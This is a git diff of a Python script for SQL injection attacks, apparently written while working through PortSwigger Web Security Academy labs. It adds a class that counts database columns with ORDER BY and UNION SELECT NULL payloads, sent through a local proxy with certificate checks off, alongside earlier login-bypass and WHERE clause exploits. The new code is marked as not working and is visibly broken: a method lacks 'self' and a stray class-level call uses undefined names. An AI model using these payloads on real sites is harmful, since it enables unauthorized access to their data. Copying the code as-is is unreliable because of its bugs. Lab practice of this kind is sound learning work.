@@ -6,8 +6,19 @@ import signal
 #import argparse
 #import textwrap
 
+"""Webtest python script for testing a web app vulnerabilities. 
+
+Created while working on the portswigger web-security labs.
+https://portswigger.net/web-security/all-labs
+
+Inspired while taking the "Web Security Academy Series" Course by Rana Khalil.
+https://academy.ranakhalil.com/courses/
+
+"""
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# For Burp Suite or ZAP proxy.
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
 
 
@@ -39,15 +50,27 @@ def run_exploit(args):
             #print('LB exploit choose: ', a)
         login_bypass = LoginBypass(sess, url, payload, text)
         login_bypass.exploit_sqli(sess, url, payload, text)
+    elif exploit_type == 'uc':
+        try:
+            payload_type, url, path_param = sys.argv[2], sys.argv[3], sys.argv[4]
+        except IndexError as error:
+            print(f"Error: {error}")
+            print('[-] Usage: %s <exploit_type> <payload_type> <url> <path_param>' % sys.argv[0])
+            print('[-] Example: python3 %s uc orderby https://website.net "/filter?category=Gifts"' % sys.argv[0])
+            print('[-] Example: python3 %s uc union https://website.net "/filter?category=Gifts"' % sys.argv[0])            
+        #for a in args:
+            #print('LB exploit choose: ', a)
+        union_cols = UnionCols(payload_type, url, path_param)
+        union_cols.column_number(payload_type, url, path_param)        
     else:
-        raise ValueError('Sorry man, this {} exploit type doesn\'t exist: '.format(exploit_type))
+        raise ValueError('Sorry, this {} exploit type doesn\'t exist here: '.format(exploit_type))
 
 
 class WhereClause():
     def __init__(self, url, payload, visible, var_to_count) -> None:
         self.url = url,
         self.payload = payload,
-        self.vislble = visible,
+        self.visible = visible,
         self.var_to_count = var_to_count
         
         
@@ -96,9 +119,9 @@ class LoginBypass():
             else:    
                 print('CSRF Error Return Type: ', message)
   
-  
+
     def exploit_sqli(self, sess, url, payload, text):
-        # Use Session to make certain parameters persistant accross the session.
+        # Use Session to make certain parameters persistent across the session.
         # You don't want to send a new request every time in this case.
         # For example, we will need the cookie to stay the same.
         sess = requests.Session()
@@ -117,6 +140,81 @@ class LoginBypass():
                 print('[-] SQL injection unsuccessful.')
         except Exception as e:
             print('SQLi Error Return Type: ', type(e))
+
+
+""" In Progress - Not working """
+class UnionCols():
+    def __init__(self, payload_type, url, path_param) -> None:
+        self.payload_type = payload_type,
+        self.url = url,
+        self.path_param = path_param    
+
+    def column_number(payload_type, url, path_param):
+        # Run exploit with ORDER BY clause.
+        if payload_type == "orderby":
+            print("[+] Using the ORDER BY clause.")
+            print("[+] Figuring out number of columns...")
+            for i in range(1,25):
+                # Assemble payload.
+                sql_payload = "'+order+by+%s--" %i
+                print(f"{i} : {sql_payload}")
+                # sql_payload = "{}%s{}".format(payload[0], payload[1]) %i
+                # Get request with payload.
+                r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
+                # Get the text from the request.
+                res = r.text
+                # If Internal Server Error is found in the text, column is the previous index. 
+                if "Internal Server Error" in res:
+                    print(f"{i} : Internal Server Error hits at column {i}.")
+                    # Subtract 1 from where index stopped to get number of columns.
+                    return i - 1
+            return False
+        # Run exploit with UNION operation.
+        elif payload_type == "union":
+            print("[+] Using a UNION operation.")
+            print("[+] Figuring out number of columns...")
+            sql_payload = "'+UNION+select+NULL--"
+            text = ",+NULL"
+            substr = "--"
+            index = sql_payload.index(substr)
+            union = False
+            for i in range(1,25):
+                # Count the number of NULL.
+                num = sql_payload.count("NULL")
+                # If current index is first NULL, run it for the first time.
+                if num == 1 and union == False:
+                    print(f"{i} : {sql_payload}")
+                    # Get request with first payload.
+                    r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
+                    # Get the text from the request.
+                    res = r.text
+                    # Assemble Payload and add another NULL
+                    sql_payload = sql_payload[:index] + text + sql_payload[index:]
+                    # If UNION select is printed in HTML on first index, return column number.
+                    if "UNION select" in res:
+                        return i
+                # If current index passed first NULL, keep adding NULL to string. 
+                elif num > 1 and union == False:
+                        print(f"{i} : {sql_payload}")
+                        sql_payload = sql_payload[:index] + text + sql_payload[index:]
+                        r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
+                        res = r.text
+                        if "UNION select" in res:
+                            union = True
+                # If current index passed first NULL and union is true, the column has been found.
+                elif num > 1 and union == True:
+                    print(f"{i} : {sql_payload}")
+                    print(f"{i} : UNION select printed in HTML at column {i}.")
+                    return i
+            return False
+
+
+    num_col = column_number(payload_type, url, path_param)
+    if num_col:
+        print("[+] SQL injection successful...")
+        print("[+] The number of columns is " + str(num_col) + "." )
+    else:
+        print("[-] The SQLi was not successful...")
                 
 
 def signal_handler(sig, frame):
@@ -135,3 +233,4 @@ if __name__ == "__main__":
         print("[-] Usage: python3 %s wc " % sys.argv[0])
         print("wc = Where Clause")
         print("lb = Login Bypass")
+        print("uc = Union Columns")
